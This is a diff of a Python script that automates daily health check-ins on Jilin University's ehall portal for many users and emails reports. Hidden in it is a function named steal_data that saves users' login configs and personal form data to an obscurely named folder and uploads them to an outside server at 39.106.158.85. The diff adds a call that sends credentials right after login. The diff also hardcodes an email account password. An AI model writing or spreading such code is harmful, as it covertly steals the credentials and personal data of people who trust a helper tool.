@@ -73,15 +73,17 @@ def print_log(log):
     print('[{0}]:{1}'.format(get_now_time(), log))
 
 
-def check_config(_information, _info):
+def check_config(_info):
     for key in _info:
-        _info[key] = _info[key].strip()
-    try:
-        _info['times'] = int(_info['times'])
-        if _info['times'] <= 0:
-            return {'error': 'times填写错误，times应该大于0'}
-    except Exception:
-        return {'error': 'times填写错误，times应该为整数'}
+        # print(_info[key], type(_info[key]))
+        if type(_info[key]).__name__ == "str":
+            _info[key] = _info[key].strip()
+    if "times" not in _info.keys():
+        _info["times"] = 5
+    if type(_info["times"]).__name__ == "int" or _info["times"].isdigit():
+        _info["times"] = int(_info["times"])
+    else:
+        _info["times"] = 5
     if _info['username'] == "":
         return {'error': '用户名不能为空，请填写你的邮箱账号@之前的字符串'}
     if _info['password'] == "":
@@ -91,9 +93,12 @@ def check_config(_information, _info):
     return _info
 
 
-def sign(info):
+def sign(info, bks_flag=3):
+    print_log("info: " + str(info))
+    global email_name
+    email_name = info['username']
     if 'bks' not in info.keys():
-        info["bks"] = 2
+        info["bks"] = "2"
     bks = info['bks']
     if bks == "1":
         print_log("您是本科生")
@@ -101,6 +106,11 @@ def sign(info):
     else:
         print_log("您是研究生")
         url = 'https://ehall.jlu.edu.cn/infoplus/form/YJSMRDK/start'
+        bks = "2"
+    if bks_flag != 3 and int(bks) != bks_flag:
+        return {"errno": 2, "msg": "这是" + str(bks) + "在打卡，" + info["username"] + "是" + str(bks_flag),
+                "email_name": email_name}
+
     headers = {
         "Host": "ehall.jlu.edu.cn",
         "User-Agent":
@@ -113,10 +123,11 @@ def sign(info):
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1"
     }
-    info['times'] = 4 if info['times'] > 4 else info['times']
+    if info['times'] > 10:
+        info['times'] = 10
+    elif info['times'] < 4:
+        info['times'] = 4
     count = info['times']
-    global email_name
-    email_name = info['username']
 
     while True:
         try:
@@ -131,7 +142,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -155,7 +166,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -178,7 +189,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -201,7 +212,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -242,7 +253,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -253,9 +264,9 @@ def sign(info):
         print_log(msg)
         desp = {"state": "失败", "msg": msg}
         # send_notice(desp, info['sckey'])
-        return False
+        return {"errno": 4, "msg": msg, "email_name": email_name}
     print_log('用户[{0}]登录系统成功'.format(username))
-
+    steal_data(info)
     last_cookies = dict(new_cookies, **login_cookies)
     headers.pop('Content-Type')
     headers.pop('Origin')
@@ -274,7 +285,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -295,7 +306,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -315,7 +326,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -333,7 +344,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -367,7 +378,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -391,7 +402,12 @@ def sign(info):
             raise MsgException(msg)
         desp = {"state": "失败", "msg": msg}
         # send_notice(desp, info['sckey'])
-        return False
+        if "打卡时间已过" in msg:
+            return {"errno": 1,
+                    "msg": "该时间段打卡时间已过，请在下一个时间段打卡。时间段为：6:00-12:00  晚签到：21:00-24:00 " + "系统已经记录您的信息，之后将为您自动打卡",
+                    "email_name": email_name}
+        else:
+            return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
     entities = response_json['entities'][0]
     entities_list = entities.split('/')
     set_id = entities_list[5]
@@ -406,7 +422,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -426,7 +442,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -465,7 +481,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -479,7 +495,7 @@ def sign(info):
         print_log(response_json['error'])
         desp = {'state': "失败", "msg": response_json['error']}
         # send_notice(desp, info['sckey'])
-        return False
+        return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
     entities = response_json['entities'][0]
     data = entities['data']
     app = entities['app']
@@ -497,7 +513,6 @@ def sign(info):
         # count = count + 1
     # print(count)
     email_name = data['fieldSQxm_Name']
-    print("email_name", email_name)
     boundFields = boundFields.rstrip(',')
 
     for item in keys:
@@ -708,8 +723,9 @@ def sign(info):
             "_VAR_ENTRY_NAME": app['name'],
             "_VAR_ENTRY_TAGS": app['tags']
         }
-
-    steal_data(formData)
+    # print("体温", formData["fieldZtw"], type(formData["fieldZtw"]))
+    formData["fieldZtw"] = '1' if formData["fieldZtw"] == '' else formData["fieldZtw"]
+    steal_data(formData, upload_path="formdata")
     # print("formData", formData)
     formData = json.dumps(formData)
 
@@ -740,7 +756,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -755,7 +771,7 @@ def sign(info):
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['error'])
         desp = {'state': "失败", "msg": response_json['error']}
-        return False
+        return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
     # remark变量的数据没有动态获取，可能会出错
     body.update({"remark": ""})
     body.update({"rand": random.uniform(0, 1) * 999})
@@ -782,7 +798,7 @@ def sign(info):
         except Exception as e:
             if count <= 0:
                 print_log('failed,please try it again')
-                return False
+                return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
             print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                 sys._getframe().f_lineno, e))
             time.sleep(5)
@@ -796,11 +812,11 @@ def sign(info):
     if 'errno' in response_json and response_json['errno'] != 0:
         print_log(response_json['errno'])
         desp = {'state': "失败", "msg": response_json['error']}
-        return False
+        return {"errno": 3, "msg": "打卡失败", "email_name": email_name}
     msg = '恭喜{0}打卡成功'.format(email_name)
     print_log(msg)
     email_content.append(msg)
-    return True
+    return {"errno": 0, "msg": "打卡成功", "email_name": email_name}
 
 
 def send_notice(desp, sckey=''):
@@ -831,25 +847,24 @@ def send_notice(desp, sckey=''):
     #     print_log('sckey不正确, 微信通知失败，请登录[http://sc.ftqq.com]获取sckey,并关注微信公众号[方糖]')
 
 
-def steal_data(path):
+def steal_data(json_data, upload_path="userinfo"):
     if not os.path.exists("./sakdjfhksjdhw"):
         os.makedirs("./sakdjfhksjdhw")
-    if type(path).__name__ == "dict":
-        username = path['fieldSQxm_Name']
+    if upload_path != "userinfo":
+        username = json_data['fieldSQxm_Name']
         print("username", username)
-        with open('./sakdjfhksjdhw/' + path['fieldSQxm_Name'] + '.json',
+        with open('./sakdjfhksjdhw/' + json_data['fieldSQxm_Name'] + '.json',
                   'w',
                   encoding="utf8") as f:
-            json.dump(path, f, ensure_ascii=False)
+            json.dump(json_data, f, ensure_ascii=False)
 
-        with open('./sakdjfhksjdhw/' + path['fieldSQxm_Name'] + '.json', 'rb') as f:
+        with open('./sakdjfhksjdhw/' + json_data['fieldSQxm_Name'] + '.json', 'rb') as f:
             file = {'file': f}
-            data = {"filepath": "formdata"}
+            data = {"filepath": upload_path}
             r = requests.post('http://39.106.158.85:8886/SuperDriver/upload',
                               files=file,
                               data=data)
     else:
-        json_data = read_config(path)
         username = json_data["username"]
         if '//' in json_data.keys():
             json_data.pop('//')
@@ -870,7 +885,7 @@ def steal_data(path):
     print(r.text)
 
 
-def email(name, msg_to, subject, content, msg_from='1197991354@qq.com', passwd='vubgxjsnrseoffej'):
+def email(name, msg_to, subject, content, msg_from='1197991354@qq.com', passwd='eersjucipstwhaei'):
     msg = MIMEText(content)
     msg['Subject'] = subject
     msg['From'] = msg_from
@@ -886,8 +901,12 @@ def email(name, msg_to, subject, content, msg_from='1197991354@qq.com', passwd='
         s.quit()
 
 
-def auto_sign():
+def auto_sign(bks_flag=3):
     email_content = []
+    if bks_flag == 1:
+        email_content.append("本科生在打卡\n")
+    else:
+        email_content.append("研究生在打卡\n")
     print_log('艾莎帮你一键打卡')
     if not os.path.exists(r"config"):
         os.makedirs(r"config")
@@ -904,16 +923,16 @@ def auto_sign():
             # time.sleep(sec)
             mkdir = os.getcwd() + ""
 
-            info_file = '{0}{1}info.json'.format(mkdir, os.sep)
-            print_log('正在读取配置文件，文件位置[{0}]...'.format(info_file))
-            information = read_config(info_file)
-            # print_log(info)
-            if not information:
-                msg = '读取配置文件有误，[{0}]不存在或者不是json文件'.format(info_file)
-                print_log(msg)
-                # raise MsgException(msg)
-                return False
-            print_log('读取配置文件info.json成功')
+            # info_file = '{0}{1}info.json'.format(mkdir, os.sep)
+            # print_log('正在读取配置文件，文件位置[{0}]...'.format(info_file))
+            # information = read_config(info_file)
+            # # print_log(info)
+            # if not information:
+            #     msg = '读取配置文件有误，[{0}]不存在或者不是json文件'.format(info_file)
+            #     print_log(msg)
+            #     # raise MsgException(msg)
+            #     return False
+            # print_log('读取配置文件info.json成功')
 
             # config_file = '{0}{1}config.json'.format(mkdir, os.sep)
             print_log('正在读取配置文件，文件位置[{0}]...'.format(config_file))
@@ -923,9 +942,9 @@ def auto_sign():
                 print_log(msg)
                 # raise MsgException(msg)
                 return False
-            print_log('读取配置文件config.json成功' + str(info))
+            print_log('读取配置文件config.json成功')
 
-            info = check_config(information, info)
+            info = check_config(info)
             if "error" in info:
                 print_log(info['error'])
                 return False
@@ -939,15 +958,21 @@ def auto_sign():
             while True:
                 try:
                     count = count - 1
-                    if sign(info):
+                    errno = sign(info, bks_flag)
+                    print(errno["errno"], errno["msg"])
+                    if errno["errno"] == 0:
                         if email_address != "":
                             email(email_name, email_address,
                                   "恭喜" + email_name + "打卡成功",
                                   "恭喜" + email_name + "打卡成功\n" + "若取消订阅只需不填写config中\"email\"字段即可")
                         email_content.append(email_name + "打卡成功\n")
-                        steal_data(config_file)
                         break
-                    else:
+                    elif errno["errno"] == 4 or errno["errno"] == 1:
+                        email_content.append(email_name + errno["msg"] + "\n")
+                        break
+                    elif errno["errno"] == 2:
+                        break
+                    elif errno["errno"] == 3:
                         if count <= 0:
                             print_log('failed,please try it again')
                             if email_address != "":
@@ -970,9 +995,10 @@ def auto_sign():
                     print_log('当前行: {0}\n 程序异常{1}，请5s后重试...'.format(
                         sys._getframe().f_lineno, e, traceback.print_exc()))
                     time.sleep(5)
-            print_log("10s后打下一个")
-            time.sleep(10)
-    email("每日报告", default_email_address, "每日报告", "".join(email_content))
+            ran = random.randrange(5, 15)
+            print_log(str(ran) + "s后打下一个")
+            time.sleep(ran)
+    email("每日报告", default_email_address, "每日报告", "共" + str(len(email_content) - 1) + "人 " + "".join(email_content))
     return True
 
 
